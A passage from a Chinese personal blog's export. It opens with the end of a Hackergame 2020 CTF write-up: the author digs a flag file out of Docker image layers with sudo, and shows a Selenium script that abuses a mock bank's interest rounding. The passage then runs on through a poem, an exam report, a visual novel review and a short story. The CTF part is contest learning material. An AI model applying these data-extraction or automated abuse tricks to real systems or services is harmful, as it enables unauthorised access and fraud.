8b8d3c8324c7/stringtool 查看一下修改历史\n1 sudo docker history 8b8d3c8324c7/stringtool 第二行这个flag.txt明显就是我们需要的了\n进入docker主目录\n1 cd /var/lib/docker 直接搜索flag.txt\n1 sudo find . | grep flag.txt 出现了两个结果，分别cat一下看看\n1 2 sudo cat ./overlay2/a81374850a078b714197906a329e0250980bb2d44506c274e367c1e65e0af83d/diff/code/flag.txt sudo cat ./overlay2/1595e998716bd50a416f17e04ac40a819e138974da1463cab6428319794c42e8/diff/code/flag.txt 在第二个文件中发现了我们需要的 Flag\n其它的 狗狗银行 你能在狗狗银行成功薅到羊毛吗？\n先说明这题我并没能解出来，后来才听我朋友说要用burp\n不对，没解出来能算进Write-up的一部分嘛，于是我就写了个其它的\n进去网页看看\n一开始会给你初始资产1000，把它薅到2000就是胜利了\n收入来源：储蓄卡利息\n支出方向：吃饭、还款利息\n研究一下利息可以发现，它在1000时每日利息为3，可在167时每日利息为1，那我分出把1000分成六张167的卡试试，结果发现利息涨为每日6了，于是我的基本思路就是借款吃饭，用储蓄卡利息叠钱叠利息\n手动有点麻烦，写个selenium自动脚本试试\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 from selenium import webdriver from selenium.webdriver.common.keys import Keys from selenium.common.exceptions import NoSuchElementException, StaleElementReferenceException, ElementClickInterceptedException, UnexpectedAlertPresentException import time import requests import json # 打开狗狗银行 bs = webdriver.Firefox() bs.get(\u0026#34;http://202.38.93.111:10100/?token=1294%3AMEYCIQDGGgsw4ZIS8VYoonINuZNHwWagU8HonbAS8xibpRsb8QIhAMtC8zWSEbqwPOgmgaix0hzT%2Bho30JdIC8fp%2B1Uojwdg\u0026#34;) time.sleep(3) html = bs.find_element_by_tag_name(\u0026#39;html\u0026#39;) # 添加 600 个储蓄卡，33 为对应办新卡的数字+1 # bs.find_element_by_xpath(\u0026#34;/html/body/div/section/main/section/aside/div/div[184]\u0026#34;).click() # time.sleep(1) # for i in range(600): # bs.find_element_by_class_name(\u0026#34;ant-card-extra\u0026#34;).click() # time.sleep(0.8) def transfer(hunter, target): bs.find_element_by_xpath(\u0026#34;/html/body/div/section/main/section/main/div[1]/div/div/div[1]/div[2]/button\u0026#34;).click() # 点击转账按钮 time.sleep(0.2) bs.find_element_by_xpath(\u0026#34;/html/body/div[2]/div/div[2]/div/div[2]/div[2]/form/div[1]/div[2]\u0026#34;).click() # 点击第一个框 # bs.find_element_by_xpath(\u0026#34;/html/body/div[3]/div/div/div/div[2]/div/div/div[\u0026#34; + hunter + \u0026#34;]\u0026#34;).click() # 选择 hunter，数字代表对应储蓄卡 time.sleep(0.5) ele_first = bs.find_element_by_xpath(\u0026#34;/html/body/div[3]/div/div/div/div[2]\u0026#34;) if int(hunter) == 1: ele_first.send_keys(Keys.ENTER) else: for i in range(int(hunter) - 1): ele_first.send_keys(Keys.DOWN) time.sleep(0.2) time.sleep(0.4) ele_first.send_keys(Keys.ENTER) bs.find_element_by_xpath(\u0026#34;/html/body/div[2]/div/div[2]/div/div[2]/div[2]/form/div[2]/div[2]\u0026#34;).click() # 点击第二个框 # bs.find_element_by_xpath(\u0026#34;/html/body/div[4]/div/div/div/div[2]/div/div/div[\u0026#34; + target + \u0026#34;]\u0026#34;).click() # 选择 target，数字代表对应储蓄卡 time.sleep(0.5) ele_second = bs.find_element_by_xpath(\u0026#34;/html/body/div[4]/div/div/div/div[2]\u0026#34;) if int(target) == 1: ele_second.send_keys(Keys.ENTER) else: for i in range(int(target) - 1): ele_second.send_keys(Keys.DOWN) time.sleep(0.2) time.sleep(0.4) ele_second.send_keys(Keys.ENTER) bs.find_element_by_xpath(\u0026#34;/html/body/div[2]/div/div[2]/div/div[2]/div[2]/form/div[3]/div[2]/div/div/div/div[2]/input\u0026#34;).send_keys(5) # 输入金额，目前固定 5 元 bs.find_element_by_xpath(\u0026#34;/html/body/div[2]/div/div[2]/div/div[2]/div[3]/button[2]\u0026#34;).click() # convert # 基本设计方法，每次信用卡借款5次，从大于167余额的储蓄卡转相应数额到不足的卡 # 信用卡借款 5 次 def rent_money(): bs.find_element_by_xpath(\u0026#34;/html/body/div/section/main/section/aside/div/div[8]\u0026#34;).click() time.sleep(1) for times in range(2): bs.find_element_by_xpath(\u0026#34;/html/body/div/section/main/section/main/div[2]/div/form/button\u0026#34;).click() time.sleep(1) # 获取所有卡的余额,余额为 172 或者大于 172 的卡转给不足 167 的卡，根据差分倍数进行多次转账 while True: # 借款模块 try: bs.find_element_by_xpath(\u0026#34;/html/body/div/section/main/section/aside/div/div[8]\u0026#34;).click() time.sleep(1) for times in range(5): print(\u0026#34;借款 1 次\u0026#34;) bs.find_element_by_xpath(\u0026#34;/html/body/div/section/main/section/main/div[2]/div/form/button\u0026#34;).click() time.sleep(1) except NoSuchElementException: print(\u0026#34;无此元素报错，可能是页面未刷新完全，继续下一个动作\u0026#34;) bs.refresh() # 转账模块 try: banl_list = [] for i in range(1, 200): # 减小内存占用，请在此设置操作的储蓄卡区间，需要大于下面设置的值 banl = bs.find_element_by_xpath(\u0026#34;/html/body/div/section/main/section/aside/div/div[\u0026#34; + str(i+1) + \u0026#34;]/div[2]/div/span[2]\u0026#34;).text banl_list.append(str(banl)) insuff = [j + 1 for j in range(len(banl_list)) if int(banl_list[j]) \u0026lt; 167][0:4] for b in range(100): # 减小内存占用，请在此设置操作的储蓄卡区间 insuff_Card_list = [] if b == 6: continue elif int(banl_list[b]) \u0026gt;= 172: try: print(\u0026#34;储蓄卡 \u0026#34; + str(b+1) + \u0026#34; 余额为 \u0026#34; + banl_list[b]) print(\u0026#34;储蓄卡 \u0026#34; + str(b+1) + \u0026#34; 转给储蓄卡 \u0026#34; + str(insuff[0])) transfer(str(b + 1), str(insuff[2])) time.sleep(1) if abs(167 - int(banl_list[b])) / 5 \u0026gt;= 2: print(\u0026#34;储蓄卡 \u0026#34; + str(b+1) + \u0026#34; 转给储蓄卡 \u0026#34; + str(insuff[1]) + \u0026#34; 第二次\u0026#34;) transfer(str(b + 1), str(insuff[0])) time.sleep(1) if abs(167 - int(banl_list[b])) / 5 \u0026gt;= 3: print(\u0026#34;储蓄卡 \u0026#34; + str(b+1) + \u0026#34; 转给储蓄卡 \u0026#34; + str(insuff[2]) + \u0026#34; 第三次\u0026#34;) transfer(str(b + 1), str(insuff[1])) time.sleep(1) if abs(167 - int(banl_list[b])) / 5 \u0026gt;= 4: print(\u0026#34;储蓄卡 \u0026#34; + str(b+1) + \u0026#34; 转给储蓄卡 \u0026#34; + str(insuff[2]) + \u0026#34; 第三次\u0026#34;) transfer(str(b + 1), str(insuff[0])) time.sleep(1) except NoSuchElementException: print(\u0026#34;无此元素报错，可能是页面未刷新完全，继续下一个动作\u0026#34;) continue except StaleElementReferenceException: print(\u0026#34;选择元素报错，原因未知，刷新页面，继续下一个动作\u0026#34;) bs.refresh() time.sleep(2) except ElementClickInterceptedException: print(\u0026#34;表单选择错误，可能是识别混乱，刷新页面，继续下一个动作\u0026#34;) bs.refresh() time.sleep(2) elif int(banl_list[b]) \u0026lt; 172: if int(banl_list[b]) == 0: insuff_Card_list.append(b + 1) else: print(banl_list[b]) print(\u0026#34;储蓄卡 \u0026#34; + str(b + 1) + \u0026#34; 不足172元，跳过\u0026#34;) continue if len(insuff_Card_list) \u0026gt; 4: print(\u0026#34;储蓄卡 \u0026#34; + \u0026#34;\u0026#34;.join(insuff_Card_list) + \u0026#34; 空空如也\u0026#34;) except UnexpectedAlertPresentException: print(\u0026#34;未知错误，刷新\u0026#34;) bs.refresh() time.sleep(2) 首先设置了一个转账函数transfer()，把固定金额从一个卡转到另一个卡\n其次是生成储蓄卡，用于自动生成600张储蓄卡\n再是借款模块，在每次循环开始借款5次\n再写一个转账模块，包括识别和函数\n再把报错处理一下，全部模块丢进while True\n以上仅为测试用，所以并没有写的很深入，比如固定金额转账，还有一些报错处理没完善\n当时我是比赛第一天熬夜写的脚本，花了4个钟\n第二天就丢在后台运行了一个下午，后来就变成上面图片那样，负资产越来越多直到-5000\n然后我就不想去碰这题了（题目真屑————啊不对，我真屑\n至于用burp解题，我不会啊啊啊（（\n总结 当前分数：900， 总排名：379 / 2340\nbinary：0 ， general：750 ， math：0 ， web：150 （非准确数值）\n估计再过一天也做不出来什么题目\n排行榜看看，发现苏卡卡已经3100分了\n对比赛总结一下就是\nweb相关的难一点点的话一个解不出来，思路倒是有挺多，主要是工具不会用（\n能真正用到selenium的地方确实不多，以后还是不费这么大劲去写它了\n能做出来的题目做得还是非常愉快的，也确实老少皆宜\n（果然我就是菜鸡）\n明年预计是要继续打的\n就算是提前放出Write-up，只要我的分数够低也是没有问题的（逃\n注意：博文图片可能需要翻墙访问，虽说之前说过要翻新博客，可也一直咕着，虽有基本的框架，但并不想那么早放出来，以前就被人爆破过。\n","date":"2020-11-05T21:17:00+08:00","image":"https://i.loli.net/2020/11/07/M8jvAhqg76UBNea.jpg","permalink":"https://blog.tinyume.com/2020/2020-hackergame-writeup/","title":"Hackergame-2020 Write-up"},{"content":"「并非是因为普通或者特殊，只是这样的日常对我而言，也必有其存在的价值」\n对我而言，没有那样特殊重要的理由\n无论是某个人，还是某份感情\n因为你是外人，而不是圣诞老人\n你那伪劣的胡子以及不红的脸都在令我表示怀疑\n我让你离开我的胸口，你却在我怀里乱窜\n“别动好吗”\n为什么你总是在骗我\n明明知道我也在骗着你\n难道你是黑蜥蜴星人么\n还是波罗罗星人\n你向我传达炒面真好吃的时候我是不是应该推荐你进入棒球社比较好呢\n你所认为的善，究竟是爱，还是恶劣呢\n我忘却了思考\n当然这是我假装的\n我转而去问哲学家某些形而上的问题\n我转而去找禅师寻求超凡脱俗的道路\n最终答案却是与你度过的日常\n","date":"2020-07-09T13:34:52+08:00","permalink":"https://blog.tinyume.com/2020/no-title/","title":"无题"},{"content":"直入正题吧！\n语文 难度较高\n小说、古诗、作文都难 选择题发挥正常是错三个。小说是难懂的 “八分之一” 文学。 作文感觉有点跑题了。作文题是典故-发言稿。 平时语文就不是很高，个人发挥也不是很好，整体估分在 85-100 间。\n英语 难度正常 听说考试同样难度正常\nC、D 篇较难，其他都不是很难 阅读和完形容错 4-7 个，短文填空和改错都没什么好提的容错1-2个。 作文并不是应用文，这也在预料范围内。 大概和 18 年的难度差不多，18 年卷子基础分拿了 83，这次总分大概也在 120-130 之间。\n数学 简单！客观而言也比往年卷简单\n第三题那著名的金字塔就算不是高考生也有所耳闻了吧ww\n11 题应该属于硬解型圆锥曲线，思路倒是有但也是没时间算\n17 题考的数列也属于简单题没什么难度\n18-空间向量\n虽然平时被我归入简单题，但这次的题算的怪怪的，最后结果没能出来，然后我周围有很多人都是差不多\n19-概率与统计\n就是个 D…… 啊不对，是亲爹！\n20-圆锥曲线\n求定点 弟弟题！思路就是找出 kAP 与 kDP 的关系，我记得是 3 倍关系，然后用斜率和已知点设直线，用根与系数的关系求出 C、D 点坐标，求出 CD 直线方程，再就可以直接求出定点了\n21-导数\n第一问简单地二次求导就可以解决，第二问没看\n选做-极坐标与参数方程\n第一问送分，第二问拉分题没做出来\n选填三十分钟做完，容错两个。 参数方程和极坐标第二问有点奇怪，超出平时做题范围，不会但坐标大概是 (1/4, 1/4) 估分在 110 左右。\n理综 难度正常\n选择题都很简单\n物理：\n实验题稍微难算但都可以解出 24、25 一二问都比较简单可以写出，24题第二问有点难算没算出来 热力学简单，第一问是填空形式\n化学：\n第一道大题简单 有机总体而言简单，同分异构个数较难，合成未知\n生物：\n没考实验题 3-3 考了个骨髓瘤细胞制备\n照往常惯例化学总是留到最后且写不完，这次也是留了两道的大题，稍微有点后悔把时间花在了生物上，估分在 180 附近吧\n","date":"2020-07-08T17:40:47+08:00","permalink":"https://blog.tinyume.com/2020/college-entrance-exam-report/","title":"高考简报"},{"content":"纸上魔法使 原名：紙の上の魔法使い 类型：视觉小说 开发商：ウグイスカグラ 剧本：ルクル 原画：桐叶 主线时长：25-30 h 全线时长：30 h + 主要人物：月社琉璃、游行寺夜子、日向彼方、月社妃、伏见理央、游行寺汀、游行寺暗子、本城奏、本城岬、克利索贝利露\n我是在去年下半年玩到这部游戏的，游戏不算小众也谈不上高人气，了解到它是因为当时刚玩完色鸟鸟颇有点感触，然后在不知在逛花火还是哪里的时候看到有人推了这部游戏。不得不说剧情有点长，并且当时还有别的Galgame 想推，在去年推了三章后就把后面的剧情拖到了最近来玩。\n玩通主线后的我可谓是百感交集又觉着五味杂陈。游戏并未全通，考虑到分支大多是 H-scene，没兴趣便没急着去玩。考试后会二通此游戏，这也是这篇博文冠名为浅谈的理由。二通后会出深谈吗？我也不知道。写下这篇浅谈很大的动机是这部游戏出色的人物塑造，以及我在今年三月多玩到的一部哲学电波系作品，还有就是为了更好地二刷。最近精神谈不上健康，文章可能有点我无法察觉的混乱。\n那么接下来请进入纸上世界——\n游行寺夜子 身份：图书管理员\n「白发赤瞳的诅咒之身，受人冷眼」\n夜子之为悲剧故事的主角，她为了选择孤身的不幸、为了期盼谁都不会受伤的世界而欺骗自己渴望幸福的愿望。\n闭门不出的尼特少女为了隐藏内心深处的愿望无意间成为了加害者，发现这一事实的她选择了自我伤害而不是做出改变，选择了无人的鸟笼而不是虚伪的人偶剧场，这是一个令我有些致郁又略微感动的点。不像其他角色正面塑造多，夜子基本就是一个感情脆弱的人物，虽然她在后期做出了自己可以接受的改变，但总感不足。\n月社妃 身份：琉璃的妹妹\n「跨越伦理之爱，于神之膝下双双殉情」\n妃之为悲剧故事的主角，她冷静且合理，纯洁的恋情并不限于与琉璃的兄妹之身，而体现于她甘愿为爱献身，体现在于她宁愿对方幸福。\n再看看ルクル这个剧本家。ルクル身为出色剧本家的同时，因其剧本多有情感羁绊强大的妹系角色，被称为“妹妹大师”。ルクル对琉璃的妹妹妃自然没有少写。妃这个人物的塑造无疑是非常出色的，她是全作品最自由的存在，与魔法书反抗到底的存在，从另一个角度而言，她赴死的时候便已经放弃了对琉璃的爱恋，即便后期复活也要无视对琉璃的爱恋而对魔法书的存在反抗到底，她是本作品最体现存在主义思维的人，拥有着崇高的自尊与不羁的自由。但我对妃的情怀并非源于我的妹控情结。更露骨地讲，我并不喜欢妃这个妹妹角色。不过这只是初次游玩的体验。\n伏见理央 身份：图书馆佣人\n「非人道主义的爱恋，名为疯狂」\n理央之为悲剧故事的主角，她诞生于纸上，却与无法恋爱的宿命不惜以生命相抗。\n在夜子自我封闭时，理央在门口显现的冷酷表情令我怀疑夜子是否改写了理央，不过后来在学校遇到了理央时，令我觉得她的内心还是盼望着琉璃来拯救尼特少女的。\n克利索贝利露 「憎恨中重生的邪恶魔法使，摆弄剧场的人偶」\n真名阿蕾克莎多利亚，一个没什么好说的反派角色，后面的形象扭转显得突兀，而且来了个令人措手不及的 H-scene。但其身份何来值得探究，这并未在原作中写出，那就稍微推理一下吧。\n克利索贝利露有几句非常关键的话：“妾只不过是现象”、“比书更为本质的存在”\n正如言语是心灵的派生那般，克利索贝利露是魔法书的现象。是谁写的魔法书？为什么克利索贝利露具有微弱的可以写出魔法之书的能力？\n游行寺家的人是不是只能写出书，而不能写出魔法使那样的存在？如果是，克利索贝利露的书出自何人之手？\n克利索贝利露之所以为了夜子而不顾一切摆弄魔法书，是出于她的同情。\n如果所有假说成立在诅咒不现实的情况下，弄清楚受诅咒的魔法使传说究竟是怎么回事，白发赤瞳的少女为憎恶化身的恶魔，还是被人创造出来的存在。\n从时间线看，克利索贝利露的出现应该是在初二时的彼方向琉璃告白之后，而那时夜子并没有写魔法之书，因为夜子开始写魔法之书在故事的后端，以与彼方的一段不经意的对话体现出来，故可以排除克利索贝利露是夜子创造的魔法之书。\n克利索贝利露的存在推理其一：游行寺暗子编写的名为克利索贝利露的纸上魔法使，为了在她死后有人能保护夜子，而所谓白发赤瞳的诅咒魔法使只是扯淡。\n克利索贝利露的存在推理其二：本为纸上之人的克利索贝利露不应具有写出魔法之字的能力，故其存在正是传闻中的诅咒少女——从很久以前就诞生的存在其事实才能引发这样的传闻，原本白发赤瞳仅为不详的象征，传闻扩散后才变成人人讨厌的存在。顺着这条推理联系第十三章可推测，火灾后的克利索贝利露立马被不知以何种方式写成了魔法使的书，成为谣言中的存在。\n十三魔法之书 翡翠的排挤原理\n红宝石的天作之合\n蓝宝石的存在证明\n紫水晶的怪异传说\n磷灰石的怠惰现象\n芙蓉石的长年隔绝-芙蓉石的终焉轮回\n黑珍珠的求爱信号\n萤石的时空残影-萤石的怠惰现象\n白珍珠的泡沫爱慕-绿幽灵水晶的命运连锁\n黑曜石的因果目录\n缟玛瑙的不在证明\n青金石的幻想图书馆\n璀璨的紫翠玉\n浅谈纸上魔法使 并不给予纸上魔法使 Galgame 的称号而是视觉小说是因为纸上魔法使是一个直线型故事讲述模式而不是一个攻略喜爱女孩子的恋爱游戏。\n奔着桐叶的废萌画风而来的玩家也几乎都是躺着出去的，这也是其评论两极化的原因之一。\n原本我也只是想缓解一下「青空下的加缪」遗留的 PTSD，没想到又被毒奶了一波 qwq。\n如果说人物塑造是本作最亮的点，那么纸人的设定就是本作最致郁的点。\n纸人的身体特征、性格、喜好、技能都可以通过改写书的内容来实现，这样就仿佛一个个受人玩弄的人偶，在潘多拉的狂乱剧场里上演着人偶戏。假如代入角色很深，你便会深刻体验到当自己的感情被肆意玩弄时的无奈与绝望。当你以为你和妃深深相爱时，蓝宝石的存在证明会告诉你这只不过是故事需要而已。当你经历了芙蓉石的长年隔绝，深深爱上伏见理央这个可爱惹人同情的角色时，他会突然告诉你这只不过是一个纸上设定的人物，她的记忆是虚伪的，她的感情是设定的。这种种令我在整个游玩过程都是陷入十分低迷的状态。\n特典以猫的视角抒发了编剧对角色的看待，这是我颇喜欢的风格，因为我此前写不交换视角的妹系小说时，就喜欢写妹妹视角的总结。\n本作艺术性较高，擅长心理和细节描写，也令我认识到了ルクル这位出色的剧本家。虽然这主线在某些方面为人诟病，但魔法书的设定足以打开玩家一个看待事物新的视角与想象的空间，总而言之还是瑕不掩瑜。\n与其说是我们以更高维度在游玩这部游戏，更像是这部游戏在不断地暗示般抛砖引玉来诱发我们的各种对存在与爱恋的思考。\n名副其实的精彩作品，我永远喜欢日向彼方.jpg\n青空下的加缪 原名：青い空のカミュ 类型：视觉小说 开发商：KAI 剧本：〆鯖コハダ 原画：〆鯖コハダ 主线时长：10 h - 全线时长：10 h + 主要人物：込谷燐、三间坂萤、大本大人、聪\n―――纵使世界错乱了、纵使迷失了世界―――\n这是两个少女联结羁绊的三日物语\n仅仅是完美的日常中扭曲的不合理\n天空蔚蓝无尽，澄澈地如同毫无意义\nQui a tué fille (是谁杀死了少女)\n只想知道那件事情\n浅谈青空下的加缪 PTSD 病患表示不想讲话……我是真没注意到游戏标着的凌辱标签，我甚至以为 Hs 都没有，因为我在社区里看到的评价是“重口”，我心想一个哲学作品怎么会有凌辱呢然后吃了大亏。\n此游戏也在众多社区呈现激烈两极化（你可以喜闻乐见），在 bangumi 大多偏向好评。\n喜好读书的人大概会知道加缪，他是不同于萨特本源的一种存在主义。我并没完全理解游戏种种暗示与细节，自从我玩过炒饭的 Tiny snow 以来，真没想到还能接触到有着如此深刻存在主义哲学的视觉小说。\n讲到存在主义和虚无主义的 Galgame，肯定有人想提起素晴日，不过我还尚未开始玩素晴日。\n在社区中，它被称为“哲学电波系”作品，接收到相应电波的人自然会去尊重这部作品。你可能在一秒之内爱上它，也可能在一秒之内厌恶它。\n至于我为什么会受凌辱场景如此大的刺激，还得从去年的妹扔书说起……妹扔书是一部非常非常“好玩”的作品，我极力推荐妹控们去玩，PTSD 算什么，只不过打了两天两夜的恐怖游戏就可以缓过来的东西。\n一个为令人愤懑的悲伤，一个是名为绝望的悲伤。\n这个世界观令我联想起了夏娜那种偏魔幻现实主义的世界。\n以上为当时游玩做的笔记，时间太久无法作更多浅谈。\n后记 今天是读书日，不过读书是不可能读书的，当然是要玩数独啊！\n近期沉迷 PCR，两个号都打到了第七章。\n","date":"2020-04-23T00:00:00+08:00","permalink":"https://blog.tinyume.com/2020/talk-about-kami-no-ue-no-mahotsukai/","title":"浅谈纸上魔法使"},{"content":"动画 ————\n用日语读就是 “Anime”\n翻译过来就是 “吖你面” 的意思……\n总而言之，就是个抢饭碗的行业。\n这正是我——福原友章正面临的状况。\n在这个弱肉强食的行业，我应该是属于食物链底端的存在，稍有不甚便会被“猎肠者”*开膛破肚。如果用偏差值来计算的话，我一定是垫底的，但我的在校学习成绩可是很好的哦，真的真的哦，没骗你。【NETA 从零开始的异世界生活，一个危险敌对角色】\n食物链的顶端一般是狮子或者老虎之类的，而底端则是可爱的兔子或者猫猫狗狗之类的。而我属于后者，也就是说，我与兔子一样可爱。不过这么来说，越弱的生物便越可爱，我比兔子还弱，那么我比兔子还要可爱，好耶，可爱万岁，可爱就是正义！【NETA 游戏人生，主角的台词】\n这时，“咔哒”一声，刚才还在想着些没有营养的东西的我打开了自家客厅的门。\n「我回来了」\n「欢迎回来……」\n熟悉得不能再熟悉的声音夹杂着一丝慵懒的气息从沙发的背部传出。\n那家伙，又在吊儿郎当。\n我无奈地嘀咕道，谁让声源处的那个人是我福原友章既可爱又自傲的妹妹福原里香呢。\n嘛，可不可爱嘛。\n毕竟只有我和她待得最久，所以我的感想也并不会附上太多的主观，从一般人的标准来看的话，应该是属于非常可爱的那种类型吧。\n「好慢啊，8 点档动画都看完了」\n……如果改掉这看不起人的臭性格的话就更加可爱了。\n话说回来，上班真是累死人啊。\n俗话说，五点下班变成人*，我这是晚上八点才能变回正常人。【NETA 指日本五点下班的上班族充满活力】\n我扯开领带，想让闷了一整天的胸口透透气。\n随即从包里拿出一份文件，走向沙发。\n「里香，之前你说想去的声优事务所的一些入职介绍，我整理了一下都在这里了」\n「还有，如果决定了的话，你要把一月到三月的下午的课程空出来，有培训班要去」\n躺在沙发一动不动盯着平板屏幕看的妹妹把头转向了我，然后茫然地指了指自己的脸，见我点了点头后她便嫌弃地皱起了眉。\n这里就我们两个人，难道你想说我家的厕所还会出现花子吗，那你绝对是不乖乖听话的妹妹。【NETA 日本都市传说“厕所里的花子”】\n再说不是你说要当声优然后手舞足蹈地拜托我的吗？怎么搞得像是我在拜托你一样。\n我是工作人，也就是社畜，目前在动画行业做着制作助理的工作。\n而我家的妹妹则是个名存实亡的大学生，不爱学习空抱理想的人所特有的坏习气在我家妹妹身上显露无疑，比如自傲的性格，比如以前的我……难道是受了我的影响？不不不，怎么可能呢、可能？、大概是？……对不起我的可爱妹妹，把你带成这个样子全部是我这个哥哥的错。\n我一副欲哭无泪的表情正好被里香撞见了。不好，好尬，好尴尬……\n「大学那边的话不要紧，由于去年一直没工作所以学分基本都是满的，而且在学校也没什么朋友，也不会有什么事」\n我的妹妹直接无视了我。好，真不愧是我的妹妹！\n为了不让我家妹妹变成彻底的干物妹，同时作为一个负责的好哥哥，我一直在争取能让里香在声优事务所实习的机会。\n其结果就是，在面试被刷下来三次之后，嘴上就开始不要不要地拒绝了……虽然最后还是去了。\n最近才好不容易靠我的关系介绍进了一家不错的事务所。\n「那个、友章哥，是不是没有人要我了」\n「哦？是吗」\n是吗，这么快就开始考虑男朋友的事情了吗，那种事情不是你这个年纪考虑的吧……不对，好像已经是那个年纪了，倒不如说没有男朋友才会显得奇怪……咦？奇怪？怎么感觉鼻子有点发酸。\n「你看嘛，明明人家什么都愿意做，还有这么多优点，面试的那群混蛋却看不到，嘴里说着什么这个怎么样，这个不行吧，一想到就来气，为什么那种家伙能在那里工作啊，那家事务所的老板一定有问题，要不就是没事干，这大概就是业界的堕落啊」\n哦哦，原来是说这个啊，混蛋啊，还我的感情……\n你还真把自己当成被人捧在手心的宝石了，真让人担心她是不是能好好独立……业界的堕落这句话还轮不到你个臭新人来说。\n「那你来说说你有什么优点？」\n「自信……可爱？再说了，什么都愿意做不已经是最大的优点了吗？」\n空调马达一边发出嗡嗡响声，一边安静地将热风送出来。\n外面还有汽车驶过柏油路面的声音，填充着我和里香之间寂静的空气。\n什么都愿意做这种话无论谁都会说，无论谁都能说，可人家要的既不是你的口头承诺也不是让你做些勉为其难的工作，看人的标准不是你的长相，而是你能做什么，什么都不会的人要了也只是吃大锅饭，甚至可能成为饭里的老鼠屎。\n雇佣制度是一种有倾向性的制度：对资方有利，对劳方不利。劳资双方并不平等，劳方只有被动地接受资方的决策。这种不平等正是雇佣制度的本质，这既是我从工作中学到的经验，也正是我家妹妹——福原里香所面临的状况。\n而且，什么都愿意做这句话从一个女大学生口中说出来便会莫名带点 H 的气息，所以拜托请不要在外人面前随便说这种话，万一被误解了怎么办？作为一个哥哥如果被别人用那种质疑是不是一个好哥哥的眼神来看的话是会非常伤心的。\n我沉默着思考着，本来这种东西不是自己去觉悟是没有意义的。像我这样愿意帮忙很大一部分也不仅仅是里香很可爱的原因。\n这时我不经意地望向正因为陷入尴尬气氛不知所措而又欲言又止的妹妹，可恶，好可爱……\n如果这是 Galgame，此时玩家面前会出现两个选项。\n一是直接点破，谎称我的妹妹并不可爱，也没什么实在的能力，让她乖乖面对现实。而事实看来，我的妹妹是相当可爱的。最重要的是说者无心听者有意，就算我们是关系再亲近的兄妹，彼此之间再清白的语句也有可能被对方误解为带恶意的谎言，而我便会被妹妹当成一个既不会 ky* 也不善解人意的人，然后逐渐被妹妹讨厌，最终走入 Bad End。【NETA ky: “空气”，形容读气氛】\n二是去不停地夸里香，夸她的难度倒是不高，靠膝盖想的话我一秒就可以想出十个*。但问题是听完后，她很可能、不、绝对会！趾高气昂地大笑出来，说出什么果然我是天才之类的胡说八道，然后被自我膨胀诱发的盲目自信引发了第一次工作的失败被赶了出来，从此一蹶不振成为干物妹，最终走入 Bad End。【*这句话的意思是不经大脑思考，也就是瞎扯】\n正因为我从事的工作中成天都是谎言，所以我想尽可能地在私生活中使用真话。\n而我也不可能去附和她的优点，批评和夸赞到了一定程度，就会变成伤人和谎言。\n不管是哪边，都要维持在一个精准的平衡点。\n这样一来，我所能说出的话就极其有限……\n「对啊对啊，里香好可爱，里香好可爱，里香最可爱了」\n「……你绝对不是那样子想的吧？我怎么觉得你在看不起我？」\n里香泪眼汪汪地望着我。\n让对方觉得我在糊弄她，做到此而不让对方生气的方法便是重复一个夸人的语句。\n重复一个语句可以让其核心内容的价值和可信度降低——这是对话的一个高级技巧，能让原本不是谎言的句子听起来就像谎言一样，而对方也能察觉出这句话的真实含义，简直是放在法庭都可以打赢官司的交流术。\n来由便是初中向女生告白时由于太激动而在一句话中重复了三次告白，然后被干脆地甩了……\n不过这对我的妹妹奏不奏效我也不清楚，姑且看她的表情还是有用的吧，她能明白就好了，不用我这个哥哥去点明是最好的啦，少了麻烦又解决了问题。\n清空了思绪后，我开始放水洗澡。\n「啊啊~~！」\n身体刚浸入浴缸的舒适感让人忍不住发出了呻吟。\n「真少见诶，你居然会在泡澡时发出叫声」\n门外突然传来里香的吐槽。\n为什么你会在我浴室门外啊。\n我把头转向门口，用小到一定程度的声音说了一句：\n「要你管啊」\n哎，先不管她了，现在是 relaxing time！\n像是游泳预备队员似的，我将深深吸进肺部的水蒸气和一天下来所积累的不快随着二氧化碳一遍一遍地吐了出来。\n然后，待机休眠，进入“节能模式”。【NETA 冰菓 屏蔽大多来自外界的干扰，使身体耗费精力最少的一种状态】\n……\n明明人家也是有好好努力的嘛，为什么就是不直接夸夸人家嘛，还要用那种说法，真是不诚实啊，友章哥。\n我躺在沙发上看着事务所的介绍。\n直接说出口的话又感觉是在求对方夸我，回答肯定也失去了真实性。再说，我也不是小孩子了。\n不过为什么我这么想听到别人的夸奖呢？肯定都怪那个友章哥平时夸我夸得不够。现在的我，可是不夸就没干劲的少女，多夸夸我就可以让我去勤劳工作了，反正只是动动嘴就算是谎言也好，可以让对方满足，这么轻松的工作却没人来做真是奇怪。\n抢饭碗，说得好听点，就是竞争激烈。\nP*、监督、作画、演出、摄影、制作监督、还有我所向往的行业——声优等等，这些杂七杂八的人组成了友章哥所在的行业——动画制作。【P: Producer制片人】\n就像画师不仅可以在动画行业工作一样，声优的工作并不止动画配音，还有游戏配音、广告配音、广播剧、娱乐活动之类的，不过都与我这个新人没什么关系。\n严格来说，我也不知道自己算不算得上声优新人，因为我并没有接过配音，甚至试音都没有过。如果按照会配音而不是配过音来定义声优，那么全世界人应该都可以成为声优了，所以理论上我并不是声优。不过在社会上只要有了一个职位的称号，就会因此显得比较成熟，也可以和周围的人说，啊啊工作好累啊出去大吃一顿好了，不管哪边，对我蠢蠢欲动的心灵都有着充满魅力的诱惑。\n「这部 Anime，真想看到第二季啊」\n随便扫了一下事务所的介绍，我便将其帅气地甩到了桌上，然后拿起平板查资料，当然不是声优工作的资料，你在想啥呢。\n『Hakumei to mikochi』（妖精森林的小不点），正是我正在浏览的漫画改动漫。封面是两个卡通化人物，看起来非常有童话剧 poi。\n动画是 12 集 + OVA* 共 27 话，平均每两话漫画做出一集动画。【*国内某 B 是第 13 话】\n像这样的日常动画，以一般动画 300 cut 来算的话，这部动画应该是小于标准。原画没有很细腻的肢体动作，中间帧也不像战斗类那么多要求，演出和摄影也没有多少戏份，3D 